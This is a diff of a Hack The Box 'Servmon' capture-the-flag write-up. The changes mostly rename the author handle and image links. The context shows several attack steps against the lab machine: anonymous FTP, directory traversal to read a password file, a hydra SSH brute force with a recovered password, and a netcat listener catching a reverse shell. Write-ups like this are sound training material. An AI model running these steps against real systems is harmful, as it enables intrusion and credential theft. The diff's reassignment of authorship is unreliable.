@@ -9,6 +9,7 @@ avatar: assets/htb/servmon.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Servmon
 ---
+
 ## Overview
 
 This was an easy Windows machine....but don't get stuck chasing the rabbits!
@@ -45,7 +46,7 @@ This was an easy Windows machine....but don't get stuck chasing the rabbits!
 First off, I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut that tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output to file with a name of `<name>`.
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ nmap -p- -sC -sV -Pn -oN servmon.nmap <YOUR_IP>
+kac0@kalimaa:~/htb/servmon$ nmap -p- -sC -sV -Pn -oN servmon.nmap <YOUR_IP>
                            
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-19 22:24 EDT                                        
 Nmap scan report for <YOUR_IP>                                                                      
@@ -183,11 +184,11 @@ Lots of open ports on this machine.  There are a number of clues in this output 
 If port `21 - FTP` is open, that is usually a good place to start as logging in as `Anonymous` can be an easy way to find useful information. To do this enter `anonymous` when it prompts you for a name, then give an email address when it prompts for a password.  This does not have to be a real address, just in the format `a@b.c`.
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ ftp <YOUR_IP>
+kac0@kalimaa:~/htb/servmon$ ftp <YOUR_IP>
 
 Connected to <YOUR_IP>.
 220 Microsoft FTP Service
-Name (<YOUR_IP>:zweilos): anonymous
+Name (<YOUR_IP>:kac0): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
 230 User logged in.
@@ -240,7 +241,7 @@ ftp>
 Through FTP I was able to find two different users, `Nadine` and `Nathan`.  Each user's folder had a text document in it with some interesting information. 
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
+kac0@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
 1) Change the password for NVMS - Complete
 2) Lock down the NSClient Access - Complete
 3) Upload the passwords
@@ -251,7 +252,7 @@ zweilos@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
 `Nathan`'s folder contained a to-do list that lets us know that there are two services `NVMS` and `NSClient` on this machine, the security of which has not been completely locked down.  It seems as if public access to `NVMS` should still be still available, and whatever "secret files" may still be in an accessible location.
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ cat Confidential.txt 
+kac0@kalimaa:~/htb/servmon$ cat Confidential.txt 
 Nathan,
 
 I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
@@ -267,7 +268,7 @@ The file `Confidential.txt` in `Nadine`'s folder gave me some more good news.  S
 
 Since I still didn't have a way in, the next place to enumerate was HTTP on port 80.  Navigating to `http://<YOUR_IP>` redirected to `http://<YOUR_IP>/Pages/login.htm` which had a page title of `NVMS-1000`.  This looks like the page with public access that `Nathan`'s to-do list had mentioned.  
 
-![NVMS-1000 Web Portal](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-20_17-14-29.png)
+![NVMS-1000 Web Portal](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-20_17-14-29.png)
 
 ### NVMS-1000 Exploit Research
 
@@ -285,7 +286,7 @@ Can use GET requests and directory traversal to access files on the system.  Blo
 
 I used Burp suite's repeater tool to craft my requests and test for this vulnerability on this machine.
 
-![Checking for LFI through directory traversal](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-20_20-53-48.png)
+![Checking for LFI through directory traversal](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-20_20-53-48.png)
 
 The machine was indeed vulnerable, and I used the information from the message `Nadine` left for `Nathan` to form my directory traversal GET request.  The server returned a list of seven passwords for me try out.
 
@@ -323,7 +324,7 @@ Gr4etN3w5w17hMySk1Pa5$
 Now that I had some credentials, it was time to try to log into the machine with them.  I decided to use the tool`hydra` to do a brute force attack against SSH for both users `Nathan` and `Nadine`.
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ hydra -l Nadine -P passwords <YOUR_IP> ssh
+kac0@kalimaa:~/htb/servmon$ hydra -l Nadine -P passwords <YOUR_IP> ssh
 
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -339,7 +340,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-20 21:07:
 Thank you `Nadine` for using one of the same passwords you recommended!
 
 ```text
-zweilos@kalimaa:~/htb/servmon$ ssh Nadine@<YOUR_IP>
+kac0@kalimaa:~/htb/servmon$ ssh Nadine@<YOUR_IP>
 Nadine@<YOUR_IP>'s password: 
 Microsoft Windows [Version 10.0.18363.752]
 (c) 2019 Microsoft Corporation. All rights reserved.
@@ -412,7 +413,7 @@ nadine@SERVMON C:\Users\Nadine\Desktop>dir
                2 Dir(s)  27,815,362,560 bytes free
 
 nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
-5ee1****ad52
+5ee1************************ad52
 ```
 
 ### Metagaming - Other user's artifacts
@@ -591,7 +592,7 @@ In order to access this page through the web browser without some sort of remote
 
 https://127.0.0.1:8443/index.html\#/
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/screenshot_2020-06-20_22-54-12.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/screenshot_2020-06-20_22-54-12.png)
 
 The web portal seemed somewhat complicated to interact with, and the instructions given in the exploit weren't completely clear how to link to the `evil.bat` script and it's scheduler through the web portal.  After doing lots of reading through the documentation on `nsclient`, I discovered an easier sounding method of interacting with the service.
 
@@ -679,7 +680,7 @@ Despite the error message seen above, once I successfully uploaded `nc.exe` to t
 ### Getting a root shell
 
 ```text
-zweilos@kalimaa:~$ nc -lvnp 12345
+kac0@kalimaa:~$ nc -lvnp 12345
 listening on [any] 12345 ...
 connect to [10.10.15.20] from (UNKNOWN) [<YOUR_IP>] 49698
 Microsoft Windows [Version 10.0.18363.752]
@@ -759,5 +760,5 @@ _Oops. Apparently in a `cmd.exe` shell the direction of the slash is important w
 ```text
 C:\Program Files\NSClient++>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
-3e42****a639
+3e42************************a639
 ```
